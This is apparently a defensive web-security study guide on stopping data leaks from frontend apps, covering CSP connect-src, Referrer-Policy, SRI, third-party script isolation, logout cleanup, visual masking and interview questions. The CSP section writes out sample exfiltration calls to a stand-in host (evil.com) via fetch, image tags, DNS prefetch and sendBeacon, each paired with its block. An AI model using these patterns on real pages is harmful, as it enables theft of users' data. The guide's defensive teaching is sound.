1. Frontend Data Leak Vectors

// Data leaves the browser through many channels:
//
// 1. NETWORK EXFILTRATION
//    - XSS sends data to attacker's server
//    - Third-party scripts phone home with user data
//    - DNS prefetch leaks hostnames to DNS resolver
//    → Defense: CSP connect-src, SRI, X-DNS-Prefetch-Control: off
//
// 2. URL LEAKAGE
//    - Referer header sends full URL to external sites
//    - Query params in browser history, server logs, analytics
//    → Defense: Referrer-Policy, POST body for sensitive data
//
// 3. STORAGE PERSISTENCE
//    - localStorage survives browser close → shared computer risk
//    - Service Worker cache persists sensitive API responses
//    → Defense: sessionStorage, Cache-Control: no-store, clear on logout
//
// 4. VISUAL LEAKAGE
//    - Screen recording, screenshots, shoulder surfing
//    - Browser extensions reading DOM
//    → Defense: masking, CSS blur on sensitive data, visibilitychange
//
// 5. ERROR/LOG LEAKAGE
//    - Stack traces with PII sent to Sentry/LogRocket
//    - console.log in production with user data
//    → Defense: beforeSend scrubbing, strip console in prod

2. CSP connect-src for Exfiltration Prevention

// connect-src controls where the page can send data
// Blocks: fetch, XHR, WebSocket, EventSource, navigator.sendBeacon

Content-Security-Policy: connect-src 'self' https://api.example.com

// Even if XSS executes, it can't send stolen data to evil.com:
// fetch('https://evil.com/steal', { body: stolenData })
// → BLOCKED by CSP connect-src (evil.com not in whitelist)
//
// Bypass attempts (and how to block):
// 1. <img src="https://evil.com/steal?data=...">
//    → Block with: img-src 'self' (only trusted image sources)
// 2. DNS prefetch: <link rel="dns-prefetch" href="//data.evil.com">
//    → Block with: X-DNS-Prefetch-Control: off
// 3. navigator.sendBeacon('https://evil.com', data)
//    → Block with: connect-src whitelist
// 4. WebRTC (STUN/TURN) — harder to block via CSP
//    → Use Permissions-Policy to disable WebRTC

Third-Party Script Leakage

// Third-party scripts (analytics, widgets, ads) have full DOM access
// They can read: form inputs, page content, cookies (if not HttpOnly)
//
// Example: analytics script reads payment form data
// document.querySelector('input[name="card"]').value
//
// Mitigations:
// 1. Load third-party scripts in sandboxed iframes
//    → they can't access your DOM
// 2. SRI (Subresource Integrity) — detect if script was modified
// 3. CSP to limit what they can connect to
// 4. Trusted Types to prevent third-party DOM XSS
// 5. Use server-side analytics proxy (send events to your server first)
// 6. Tag management via GTM with restricted access
// 7. Regular audit: what third-party scripts are loaded?

Logout Data Cleanup

function secureLogout() {
  // 1. Clear in-memory tokens
  tokenManager.clear();

  // 2. Clear all browser storage
  localStorage.clear();
  sessionStorage.clear();

  // 3. Clear IndexedDB
  indexedDB.databases().then(dbs => {
    dbs.forEach(db => indexedDB.deleteDatabase(db.name));
  });

  // 4. Unregister Service Workers (clear their caches)
  navigator.serviceWorker.getRegistrations().then(regs => {
    regs.forEach(reg => reg.unregister());
  });

  // 5. Clear Cache API
  caches.keys().then(names => {
    names.forEach(name => caches.delete(name));
  });

  // 6. Server-side: revoke refresh token
  fetch('/auth/logout', { method: 'POST', credentials: 'include' });

  // 7. Broadcast to all tabs
  new BroadcastChannel('auth').postMessage({ type: 'LOGOUT' });

  // 8. Redirect to login
  window.location.href = '/login';
}

FAANG Interview Questions

Q1: How do you prevent data exfiltration from a frontend application?
Defense in depth: (1) CSP — restrict connect-src to only your API domains. Even if XSS executes, it can't phone home to an attacker's server. Also restrict img-src (image-based exfiltration), style-src (CSS-based), and default-src as fallback. (2) Subresource Integrity — hash all CDN-loaded scripts. If a CDN is compromised, the browser blocks the modified script. (3) Referrer-Policy: strict-origin-when-cross-origin — prevent URL data leaking via Referer headers. (4) X-DNS-Prefetch-Control: off — prevent DNS-based exfiltration where data is encoded in subdomain queries. (5) Permissions-Policy — disable unused APIs (WebRTC could bypass connect-src). (6) Third-party script isolation — load analytics/widgets in sandboxed iframes. (7) Error tracking scrubbing — beforeSend hooks strip PII before sending to Sentry. (8) Log cleanup — remove console.log in production builds. The key insight: CSP connect-src is your primary exfiltration defense, but you need to cover all channels (images, DNS, etc.).
Follow-up: Can WebRTC bypass CSP connect-src?
Q2: What should a proper logout implementation clear in the browser?
Comprehensive logout: (1) In-memory tokens — set to null (access token, user state). (2) Server-side — POST /auth/logout to revoke the refresh token. (3) Cookies — the server's logout response should clear all auth cookies (Set-Cookie with expired date). (4) localStorage — clear all app-related keys (or localStorage.clear if the domain is exclusively yours). (5) sessionStorage — clear it. (6) IndexedDB — delete app databases. (7) Cache API — clear cached API responses that may contain sensitive data. (8) Service Worker — unregister (or have the SW clear its caches on a logout message). (9) BroadcastChannel — notify all tabs to logout. (10) Application state — reset Redux/Zustand stores to initial state. (11) Redirect to login page. Most apps miss: IndexedDB, Cache API, Service Worker, and multi-tab coordination. A public computer where logout doesn't clear these stores leaves user data accessible to the next person.
Follow-up: How do you test that logout actually clears everything?

1. Visual Data Protection

// Blur sensitive content when user leaves or tab is in background

const sensitiveElements = document.querySelectorAll('[data-sensitive]');

document.addEventListener('visibilitychange', () => {
  const blur = document.hidden ? 'blur(10px)' : 'none';
  sensitiveElements.forEach(el => {
    el.style.filter = blur;
  });
});

// Disable copy on sensitive fields:
document.querySelector('.sensitive-value').addEventListener('copy', (e) => {
  e.preventDefault();
  e.clipboardData.setData('text/plain', '[REDACTED]');
});

// Mask on print:
// @media print { [data-sensitive] { filter: blur(10px); } }

2. Audit Trail for Data Access

// Log when sensitive data is viewed on the frontend

function SensitiveView({ dataType, resourceId, children }) {
  useEffect(() => {
    // Log the data access event
    logAuditEvent({
      action: 'VIEW_SENSITIVE_DATA',
      dataType,       // 'SSN', 'CREDIT_CARD', etc.
      resourceId,     // Which record
      timestamp: new Date().toISOString(),
    });
  }, [dataType, resourceId]);

  return <div data-sensitive>{children}</div>;
}

async function logAuditEvent(event) {
  navigator.sendBeacon(
    '/api/audit',
    JSON.stringify(event)
  );
}

Data Leak Prevention Checklist

✅ CSP connect-src: whitelist only your API domains
✅ CSP img-src: prevent image-based exfiltration
✅ SRI on all CDN-loaded scripts and styles
✅ Referrer-Policy: strict-origin-when-cross-origin
✅ X-DNS-Prefetch-Control: off
✅ Permissions-Policy: disable WebRTC, camera, etc.
✅ Third-party scripts in sandboxed iframes when possible
✅ Error tracking: scrub PII in beforeSend hooks
✅ Strip console.log in production builds
✅ Cache-Control: no-store on sensitive API responses
✅ Comprehensive logout: clear all storage, caches, SW, tabs
✅ Visual protection: blur on visibility change, disable copy
✅ Audit trail: log all sensitive data access events
✅ Regular third-party script audits
